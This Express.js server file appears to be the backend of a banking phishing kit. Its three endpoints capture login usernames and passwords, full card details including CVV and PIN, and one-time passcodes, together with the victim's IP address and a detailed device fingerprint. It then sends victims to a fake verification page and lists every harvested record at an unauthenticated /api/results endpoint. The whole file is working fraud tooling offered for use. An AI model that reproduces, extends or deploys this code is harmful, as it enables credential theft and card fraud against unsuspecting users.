const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const INCLUDE_OTP = process.env.INCLUDE_OTP !== 'false';

let submissions = [];

function getOrCreate(sessionId) {
  let entry = submissions.find(s => s.sessionId === sessionId);
  if (!entry) {
    entry = { sessionId, id: Date.now(), time: new Date().toLocaleString(), status: 'incomplete' };
    submissions.unshift(entry);
  }
  return entry;
}

// STEP 1 — Username + Password
app.post('/api/step1', (req, res) => {
  const { username, password, deviceInfo, sessionId } = req.body;
  if (!username || !password) {
    return res.status(400).json({ success: false, message: 'All fields required.' });
  }

  const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() ||
             req.headers['x-real-ip'] ||
             req.socket.remoteAddress || 'Unknown';

  const sid = sessionId || Date.now().toString();
  const entry = getOrCreate(sid);

  Object.assign(entry, {
    sessionId: sid,
    username, password,
    ip,
    userAgent:    deviceInfo?.userAgent    || req.headers['user-agent'] || 'Unknown',
    platform:     deviceInfo?.platform     || 'Unknown',
    language:     deviceInfo?.language     || 'Unknown',
    screenRes:    deviceInfo?.screenRes    || 'Unknown',
    timezone:     deviceInfo?.timezone     || 'Unknown',
    cookiesOn:    deviceInfo?.cookiesOn    || 'Unknown',
    online:       deviceInfo?.online       || 'Unknown',
    referrer:     deviceInfo?.referrer     || 'Unknown',
    deviceMemory: deviceInfo?.deviceMemory || 'Unknown',
    cores:        deviceInfo?.cores        || 'Unknown',
    touchPoints:  deviceInfo?.touchPoints  || 'Unknown',
    colorDepth:   deviceInfo?.colorDepth   || 'Unknown',
    connection:   deviceInfo?.connection   || 'Unknown',
    step: 1
  });

  return res.json({ success: true, redirectUrl: '/card.html', sessionId: sid });
});

// STEP 2 — Card Details
app.post('/api/step2', (req, res) => {
  const { name, card, expdate, cvv, pin, sessionId } = req.body;
  if (!name || !card || !expdate || !cvv || !pin) {
    return res.status(400).json({ success: false, message: 'All fields required.' });
  }

  const entry = getOrCreate(sessionId || Date.now().toString());
  Object.assign(entry, { name, card, expdate, cvv, pin, step: 2 });

  if (INCLUDE_OTP) {
    return res.json({ success: true, redirectUrl: '/otp.html', sessionId: entry.sessionId });
  } else {
    entry.status = 'complete';
    return res.json({ success: true, redirectUrl: '/verification.html', sessionId: entry.sessionId });
  }
});

// STEP 3 — OTP
app.post('/api/step3', (req, res) => {
  const { otp, sessionId } = req.body;
  if (!otp || otp.length !== 6) {
    return res.status(400).json({ success: false, message: 'Enter the full 6-digit code.' });
  }

  const entry = getOrCreate(sessionId || Date.now().toString());
  Object.assign(entry, { otp, step: 3, status: 'complete' });

  return res.json({ success: true, redirectUrl: '/verification.html' });
});

app.get('/api/results', (req, res) => res.json(submissions));
app.get('/api/config', (req, res) => res.json({ includeOtp: INCLUDE_OTP }));

app.listen(PORT, () => console.log(`Running on port ${PORT}`));
